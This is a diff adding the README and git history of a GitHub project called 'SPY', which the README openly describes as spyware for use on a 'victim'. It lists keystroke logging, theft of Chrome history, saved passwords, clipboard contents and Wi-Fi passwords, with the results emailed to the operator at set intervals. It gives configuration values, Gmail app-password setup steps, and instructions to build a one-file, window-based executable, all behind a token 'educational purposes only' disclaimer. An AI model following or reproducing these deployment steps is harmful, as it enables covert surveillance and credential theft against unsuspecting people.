@@ -1,0 +1,162 @@
+======================: FILES :======================
+======================: README CONTENT :======================
+## DISCLAIMER
+**THIS TOOLS IS FOR EDUCATIONAL PURPOSES ONLY.**
+
+ **BE RESPONSABLE OF YOUR ACTIONS!**
+
+
+
+# SPY
+
+Spy is a Python project that does what the name suggests **Spys on your victim**.
+
+- Get the victim's machine infos 
+
+- Stores the victim's key strokes 
+
+- Dumps the victim's chrome history 
+
+- Dumps the victim's chrome stored passwords
+
+- Get the victim's clipboard if existed 
+
+- Get the victim's wifi connections list with corresponding passwords 
+
+- Send all these informations to your email every 'n' seconds 
+
+
+
+## Requirements 
+
+Use the package manager [pip](https://pip.pypa.io/en/stable/) to install requirements.
+
+```bash
+pip3 install -r requirements.txt
+```
+
+## Usage
+Change these variables to adapt to your usage  
+```python
+addr = "M3LIODA5@gmail.com" 
+#put your email adress here  
+passwd = r"REDACTED"
+# email password here 
+dir_path = 'C:\\Users\\Public\\Logs\\'
+#where the malware stores data
+delay = 600 
+# send an email every 600 seconds
+```
+Do not use your email password the SMTP library won't accept it 
+
+Go to your Google Account.
+
+Select Security.
+
+
+
+![Alt text](https://github.com/SaidAbderrahmen/SPY/blob/main/screenshots/Capture1.PNG?raw=true)
+
+
+
+Under "Signing in to Google," select App Passwords. 
+
+You may need to sign in. If you don’t have this option, it might be because:
+
+Two-Factor Authentication is not set up for your account.\
+Two-Factor Authentication is only set up for security keys.\
+Your account is through work, school, or other organization.\
+You turned on Advanced Protection.
+
+At the bottom, choose Select app and choose **Mail** and then Select **Windows computer**.
+
+![Alt text](https://github.com/SaidAbderrahmen/SPY/blob/main/screenshots/Capture11.PNG?raw=true)
+
+
+Follow the instructions to enter the App Password.\
+The App Password is the 16-character code in the yellow bar on your device.
+
+Copy Paste your Password and Run .
+
+```python
+python3 spy.py
+```
+
+Or you can turn it to an executable using PyInstaller or Auto-Py-to-exe which i recommend 
+```bash
+pip3 install auto-py-to-exe
+```
+```bash
+auto-py-to-exe
+```
+
+Locate spy.py 
+
+![Alt text](https://github.com/SaidAbderrahmen/SPY/blob/main/screenshots/Capture.PNG?raw=true)
+
+
+Check the One-file and the Window-based options 
+
+Start converting
+
+RUN!!
+ 
+
+ ## Output 
+
+
+![Alt text](https://github.com/SaidAbderrahmen/SPY/blob/main/screenshots/Capture111.PNG?raw=true)
+
+
+## License
+[MIT](https://choosealicense.com/licenses/mit/)====================== GIT HISTORY: ======================
+52ecb90 HEAD@{0}: clone: from https://github.com/SaidAbderrahmen/SPY
+commit 52ecb906b2b2e7edbd6efd79687c25e88b647c1f
+Author: Abderrahmen Said <83379308+SaidAbderrahmen@users.noreply.github.com>
+Date:   Sat Jun 25 05:42:52 2022 +0000
+
+    Add files via upload
+    
+    Requirements to run the project
+
+commit 911765f9a04776ce73d97e58060c6bf4d9129ebd
+Author: Abderrahmen Said <83379308+SaidAbderrahmen@users.noreply.github.com>
+Date:   Sat Jun 25 05:42:13 2022 +0000
+
+    Delete requirements.txt
+
+commit a94cf083fa9efa46726d76036d414825b00b688b
+Author: Abderrahmen Said <83379308+SaidAbderrahmen@users.noreply.github.com>
+Date:   Sat Jun 25 05:41:55 2022 +0000
+
+    ReadMe
+
+commit 2ac83283d6a1696fc01ba7861d86f36c5ba4d2d4
+Author: Abderrahmen Said <83379308+SaidAbderrahmen@users.noreply.github.com>
+Date:   Sat Jun 25 05:40:10 2022 +0000
+
+    v1.0
+
+commit 9deaa27ee559e8459e97a92a261c9bb518b07581
+Author: Abderrahmen Said <83379308+SaidAbderrahmen@users.noreply.github.com>
+Date:   Sat Jun 25 05:39:29 2022 +0000
+
+    Delete README.md
+
+commit 2a9d348c3200da782fc3903f7cd15a2066dd6210
+Author: Abderrahmen Said <83379308+SaidAbderrahmen@users.noreply.github.com>
+Date:   Sat Jun 25 05:39:13 2022 +0000
+
+    Delete spy.py
+
+commit b37f815817da9aac184363f04762a3e79492c9e6
+Author: Abderrahmen Said <83379308+SaidAbderrahmen@users.noreply.github.com>
+Date:   Sat Jun 25 05:28:27 2022 +0000
+
+    Add files via upload
+
+commit b5c2a730b9fa2ce5b1fe8be4619ebabf3d1e081d
+Author: Abderrahmen Said <83379308+SaidAbderrahmen@users.noreply.github.com>
+Date:   Sat Jun 25 05:26:44 2022 +0000
+
+    Initial commit
